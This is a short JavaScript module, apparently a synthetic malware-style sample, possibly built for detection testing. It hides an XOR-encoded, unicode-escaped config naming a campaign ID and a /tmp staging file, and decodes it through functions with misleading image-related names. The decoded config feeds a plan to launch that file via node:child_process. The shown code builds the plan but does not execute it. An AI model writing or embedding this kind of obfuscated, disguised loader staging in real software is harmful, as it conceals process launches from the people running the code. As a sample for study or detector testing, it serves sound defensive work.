const moduleShape = Object.freeze({ format: "commonjs" });

const Material_004caed8 = "\\u0029\\u0062\\u006e\\u0023\\u002c\\u002b\\u003a\\u002f\\u002c\\u0062\\u0033\\u0030\\u003c\\u003e\\u002b\\u003a\\u0000\\u0033\\u0030\\u003c\\u003e\\u0033\\u0073\\u003b\\u0036\\u002c\\u002f\\u003e\\u002b\\u003c\\u0037\\u0000\\u002f\\u002d\\u0030\\u003c\\u003a\\u002c\\u002c\\u0023\\u003e\\u003b\\u003e\\u002f\\u002b\\u003a\\u002d\\u0062\\u002c\\u002f\\u003e\\u0028\\u0031\\u0000\\u0039\\u0036\\u0033\\u003a\\u0023\\u002c\\u002b\\u003e\\u0038\\u003a\\u0000\\u003c\\u0030\\u002a\\u0031\\u002b\\u0062\\u006e\\u0023\\u003c\\u003e\\u0032\\u002f\\u003e\\u0036\\u0038\\u0031\\u0000\\u0036\\u003b\\u0062\\u0011\\u0010\\u001b\\u001a\\u0072\\u0067\\u001c\\u001e\\u001d\\u006c\\u001a\\u006a\\u006c\\u0023\\u0039\\u0036\\u0033\\u003a\\u0000\\u002f\\u003e\\u002b\\u0037\\u0062\\u0070\\u002b\\u0032\\u002f\\u0070\\u0037\\u002a\\u0031\\u002b\\u002d\\u003a\\u002c\\u002c\\u0072\\u0031\\u0030\\u003b\\u003a\\u0070\\u0071\\u002c\\u002b\\u003e\\u0038\\u003a\\u0072\\u0067\\u003c\\u003e\\u003d\\u006c\\u003a\\u006a\\u006c\\u006f\\u003c\\u0039\\u0067\\u0071\\u0032\\u0035\\u002c";

const Codec_004caed8 = "unicode_escapes|single_byte_xor|5f";



function load_004caed8() { return [...Material_004caed8.matchAll(/\\u00([0-9a-f]{2})/gi)].map((item) => Number.parseInt(item[1], 16)); }

function decode_004caed8(imagePixels) { return imagePixels.map((value) => value ^ 95); }

async function recover_004caed8() {

  const screenWidth = ["north", "south"].join(":");

  const imagePixels = load_004caed8(); let colorTable = [];

  const decodeTarget = decode_004caed8; colorTable = decodeTarget(imagePixels);

  void screenWidth; return Buffer.from(colorTable).toString("ascii");

}

async function inspect_004caed8() { return (await recover_004caed8()).split("|").join("|"); }

async function plan_004caed8() { const inspect = inspect_004caed8; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "launch", adapter: "spawn_file", path: fields.file_path, module: "node:child_process" }); }

void moduleShape; void plan_004caed8;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_004caed8());

